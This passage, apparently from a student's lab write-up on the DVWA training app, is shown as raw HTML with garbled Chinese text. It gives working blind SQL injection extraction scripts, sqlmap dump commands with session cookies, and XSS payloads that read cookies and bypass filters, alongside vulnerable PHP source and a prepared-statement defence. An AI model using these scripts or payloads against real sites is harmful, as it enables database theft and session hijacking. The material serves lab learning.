class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(fl4g),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div><p><img src="https://i.loli.net/2020/11/06/9taguv2jR6cU5VD.png" srcset="/img/loading.gif" alt="bsqll-3.png"></p><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre></div><h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h3><h4 id="æ‰‹å·¥åŠ è„šæœ¬-1"><a href="#æ‰‹å·¥åŠ è„šæœ¬-1" class="headerlink" title="æ‰‹å·¥åŠ è„šæœ¬"></a>æ‰‹å·¥åŠ è„šæœ¬</h4><p>ä¸lowçº§åˆ«ä¸åŒï¼Œä¸­çº§åˆ«æäº¤æ•°æ®æ˜¯postç±»å‹ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…åå†æäº¤ã€‚</p><div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> length(database())=4 #&amp;<span class="hljs-attribute">Submit</span>=Submitæç¤ºUser ID exists <span class="hljs-keyword">in</span> the database.<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> length(database())=5 #&amp;<span class="hljs-attribute">Submit</span>=SubmitUser ID is MISSING <span class="hljs-keyword">from</span> the database</code></pre></div><p>æ‰€ä»¥æ€è·¯è¿˜æ˜¯ä¸lowçº§åˆ«ä¸€æ ·ï¼Œåªä¸è¿‡è„šæœ¬ä¸­æäº¤æ•°æ®çš„æ–¹å¼æ”¹ä¸ºPOSTç±»å‹</p><p>ç›´æ¥ä¸Šè„šæœ¬</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span>header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>&#125;flag = <span class="hljs-string">""</span>t = <span class="hljs-string">""</span>sum=<span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment">#payload = "1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>        <span class="hljs-comment">#payload = "1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23".format(i,mid)</span>        <span class="hljs-comment">#payload = "1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>        payload = <span class="hljs-string">"1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)        data = &#123;<span class="hljs-string">'id'</span>: payload, <span class="hljs-string">'Submit'</span>: <span class="hljs-string">'Submit'</span>&#125;        response = requests.post(url,headers = header,data=data)        t = response.text        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    print(mid)    flag = flag + chr(mid)print(flag)</code></pre></div><h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--dbs</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa <span class="hljs-params">--tables</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa -T flag <span class="hljs-params">--columns</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre></div><p><img src="https://i.loli.net/2020/11/12/uI6w2bnCjsJfQHG.png" srcset="/img/loading.gif" alt="bsqlh-1.png"></p><p>sqlmapä¸­ç»™äº†ä¸‰ç§æ³¨å…¥æ–¹å¼ï¼Œå¹¶ä¸”ç»™å‡ºäº†payloadï¼Œå¯ä»¥åŸºäºç»™å‡ºçš„æç¤ºç»§ç»­åšä¸‹å»</p><p>ä¸‹é¢æ˜¯sqlmapçˆ†å‡ºçš„flagã€‚</p><p><img src="https://i.loli.net/2020/11/12/ZdwnMI6vhbRCikc.png" srcset="/img/loading.gif" alt="bsqlh-2.png"></p><p>æºç åˆ†æ</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;     <span class="hljs-comment">// Get input </span>    $id = $_POST[ <span class="hljs-string">'id'</span> ];     $id = mysql_real_escape_string( $id );     <span class="hljs-comment">// Check database </span>    $getid  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;     $result = mysql_query( $getid ); <span class="hljs-comment">// Removed 'or die' to suppress mysql errors </span>    <span class="hljs-comment">// Get results </span>    $num = @mysql_numrows( $result ); <span class="hljs-comment">// The '@' character suppresses errors </span>    <span class="hljs-keyword">if</span>( $num &gt; <span class="hljs-number">0</span> ) &#123;         <span class="hljs-comment">// Feedback for end user </span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;     &#125;     <span class="hljs-keyword">else</span> &#123;         <span class="hljs-comment">// Feedback for end user </span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;     &#125;     <span class="hljs-comment">//mysql_close(); </span>&#125; <span class="hljs-meta">?&gt;</span></code></pre></div><p><strong>mysql_real_escape_string()</strong> è°ƒç”¨mysqlåº“çš„å‡½æ•° mysql_real_escape_string, åœ¨ä»¥ä¸‹å­—ç¬¦å‰æ·»åŠ åæ–œæ : <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>&#39;</code>, <code>&quot;</code> å’Œ <code>\x1a</code>.</p><p>æœ¬è´¨ä¸Šè·Ÿlowçº§åˆ«çš„æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ï¼Œåªæ˜¯å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨å…¥æ—¶æ²¡æœ‰ç”¨åˆ°è¿™äº›å­—ç¬¦ï¼Œæ‰€ä»¥æ³¨å…¥è¯­å¥åŸºæœ¬å’Œlowçº§åˆ«ä¸€æ ·</p><h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-string">GET</span> <span class="hljs-string">/dvwa/vulnerabilities/sqli_blind/</span> <span class="hljs-string">HTTP/1.1</span><span class="hljs-attr">Host:</span> <span class="hljs-number">10.5</span><span class="hljs-number">.8</span><span class="hljs-number">.66</span><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64;</span> <span class="hljs-string">rv:82.0)</span> <span class="hljs-string">Gecko/20100101</span> <span class="hljs-string">Firefox/82.0</span><span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="hljs-attr">Referer:</span> <span class="hljs-string">http://10.5.8.66/dvwa/vulnerabilities/sqli/</span><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><span class="hljs-attr">Cookie:</span> <span class="hljs-string">id=1;</span> <span class="hljs-string">security=high;</span> <span class="hljs-string">PHPSESSID=e31dkassqtg9388l159fn72ac1</span><span class="hljs-attr">Upgrade-Insecure-Requests:</span> <span class="hljs-number">1</span><span class="hljs-attr">Cache-Control:</span> <span class="hljs-string">max-age=0</span></code></pre></div><p>æŠ“åŒ…åå¯ä»¥å‘ç°æäº¤çš„å‚æ•°<code>id</code>åœ¨cookieä¸­ï¼Œæ‰€ä»¥ä¸ä¸­çº§åˆ«çš„æ–¹æ³•ä¸ä¸€æ ·äº†ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä½¿ç”¨sqlmapæ³¨å…¥ã€‚</p><h4 id="æ‰‹å·¥åŠ è„šæœ¬-2"><a href="#æ‰‹å·¥åŠ è„šæœ¬-2" class="headerlink" title="æ‰‹å·¥åŠ è„šæœ¬"></a>æ‰‹å·¥åŠ è„šæœ¬</h4><p>é€šè¿‡æ‰‹å·¥æµ‹è¯•å‘ç°æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸lowçº§åˆ«çš„è„šæœ¬å¤§åŒå°å¼‚ï¼Œåªæ˜¯å°†æ³¨å…¥çš„ä½ç½®æ”¹åˆ°äº†cookieçš„ä½ç½®</p><p><img src="https://i.loli.net/2020/11/12/I257FMGp9VNfiac.png" srcset="/img/loading.gif" alt="bsqlh-3.png"></p><p><img src="https://i.loli.net/2020/11/12/TtyDpsOmZEfBbVe.png" srcset="/img/loading.gif" alt="bsqlh-4.png"></p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span>t=<span class="hljs-string">""</span>flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment">#payload = "1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>        payload = <span class="hljs-string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23".format(i,mid)</span>        id = payload        header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"id="</span>+payload+<span class="hljs-string">";"</span>+<span class="hljs-string">"security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>&#125;        <span class="hljs-comment">#print(header)</span>        response = requests.post(url,headers = header)        t = response.text        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    print(mid)    <span class="hljs-comment">#print(t)</span>    flag = flag + chr(mid)print(flag)</code></pre></div><h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre></div><p><img src="https://i.loli.net/2020/11/12/jLdrQDiI9XlAZcU.png" srcset="/img/loading.gif" alt="bsqlh-5.png"></p><h3 id="sqlæ³¨å…¥é˜²å¾¡"><a href="#sqlæ³¨å…¥é˜²å¾¡" class="headerlink" title="sqlæ³¨å…¥é˜²å¾¡"></a>sqlæ³¨å…¥é˜²å¾¡</h3><p>é€šè¿‡æŸ¥çœ‹impossibleæºç å‘ç°æ£€æµ‹äº†idæ•°æ®ç±»å‹ï¼Œä½¿ç”¨äº†é¢„ç¼–è¯‘ç»‘å®šidå˜é‡ï¼Œæœ‰æ•ˆé˜²æ­¢SQLæ³¨å…¥ï¼Œè¿™äº›å¯ä»¥åœ¨ä»¥åç¼–ç¨‹ä¸­åº”ç”¨ï¼Œä»¥ç¼–å†™å‡ºæ›´åŠ å®‰å…¨çš„ä»£ç ã€‚</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Submit'</span> ] ) ) &#123;    <span class="hljs-comment">// Check Anti-CSRF token</span>    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );    <span class="hljs-comment">// Get input</span>    $id = $_GET[ <span class="hljs-string">'id'</span> ];    <span class="hljs-comment">// Was a number entered?</span>    <span class="hljs-keyword">if</span>(is_numeric( $id )) &#123;   <span class="hljs-comment">//æ£€æµ‹æäº¤çš„æ•°æ®æ˜¯å¦ä¸ºæ•°å­—ç±»å‹</span>        <span class="hljs-comment">// Check the database</span>        $data = $db-&gt;prepare( <span class="hljs-string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );<span class="hljs-comment">//é¢„ç¼–è¯‘ç»‘å®šäº†idå˜é‡</span>        $data-&gt;bindParam( <span class="hljs-string">':id'</span>, $id, PDO::PARAM_INT );        $data-&gt;execute();        <span class="hljs-comment">// Get results</span>        <span class="hljs-keyword">if</span>( $data-&gt;rowCount() == <span class="hljs-number">1</span> ) &#123;            <span class="hljs-comment">// Feedback for end user</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">// User wasn't found, so the page wasn't!</span>            header( $_SERVER[ <span class="hljs-string">'SERVER_PROTOCOL'</span> ] . <span class="hljs-string">' 404 Not Found'</span> );            <span class="hljs-comment">// Feedback for end user</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;        &#125;    &#125;&#125;<span class="hljs-comment">// Generate Anti-CSRF token</span>generateSessionToken();<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);<span class="hljs-comment">// Is there any input?</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;    <span class="hljs-comment">// Feedback for end user</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="hljs-string">'name'</span> ] . <span class="hljs-string">'&lt;/pre&gt;'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p> å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ç›´æ¥å¼•ç”¨äº†nameå‚æ•°ï¼Œå¹¶æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„XSSæ¼æ´ ã€‚</p><p>å…ˆæµ‹è¯•ä¸€ä¸‹</p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">"xss"</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202557058.png" srcset="/img/loading.gif" alt="image-20201026202557058"></p><p>è·å–cookie</p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202647823.png" srcset="/img/loading.gif" alt="image-20201026202647823"></p><h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);<span class="hljs-comment">// Is there any input?</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;    <span class="hljs-comment">// Get input</span>    $name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $_GET[ <span class="hljs-string">'name'</span> ] );    <span class="hljs-comment">// Feedback for end user</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>ä»£ç å®¡è®¡åå¯ä»¥å‘ç°æ˜¯å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œå°†<strong>&lt;script&gt;</strong>æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥åŒå†™ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚</p><p>æ„é€ payloadï¼š</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;//ä½¿ç”¨å…¶ä»–æ ‡ç­¾<span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre></div><p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" srcset="/img/loading.gif" alt="xssmid.png"></p><h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);<span class="hljs-comment">// Is there any input?</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;    <span class="hljs-comment">// Get input</span>    $name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $_GET[ <span class="hljs-string">'name'</span> ] );    <span class="hljs-comment">// Feedback for end user</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>å…ˆä»£ç å®¡è®¡ï¼Œæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢,å…¶ä¸­ <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> æ˜¯æ­£åˆ™è¡¨è¾¾å¼ <code>(.*)</code> è¡¨ç¤ºè´ªå©ªåŒ¹é…ï¼Œ<code>/i</code> è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™æ‰€ä»¥åœ¨Highçº§åˆ«çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰å…³äº  <code>&lt;script&gt;</code> æ ‡ç­¾å‡è¢«è¿‡æ»¤åˆ é™¤äº† ,å¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ ‡ç­¾ã€‚</p><p>æ„é€ payloadï¼š</p><div class="hljs"><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre></div><p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" srcset="/img/loading.gif" alt="xssmid.png"></p><h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );    <span class="hljs-comment">// Sanitize message input</span>    $message = stripslashes( $message );    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    <span class="hljs-comment">// Sanitize name input</span>    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    <span class="hljs-comment">// Update database</span>    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );    <span class="hljs-comment">//mysql_close();</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p> <code>isset()</code> å‡½æ•°åœ¨phpä¸­ç”¨æ¥æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼Œè¯¥å‡½æ•°è¿”å›çš„æ˜¯å¸ƒå°”ç±»å‹çš„å€¼ï¼Œå³true/false </p><p> <code>trim()</code> å‡½æ•°ä½œç”¨ä¸ºç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ </p><p> <code>stripslashes()</code> å‡½æ•°ç”¨äºåˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ  </p><p> <code>mysqli_real_escape_string()</code> å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå·<code>(\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œ&#39;ï¼Œ&quot;ï¼Œ\x1a)</code> è¿›è¡Œè½¬ä¹‰ </p><p> åœ¨ä»£ç ä¸­å¯¹messageï¼Œnameè¾“å…¥æ¡†å†…å®¹  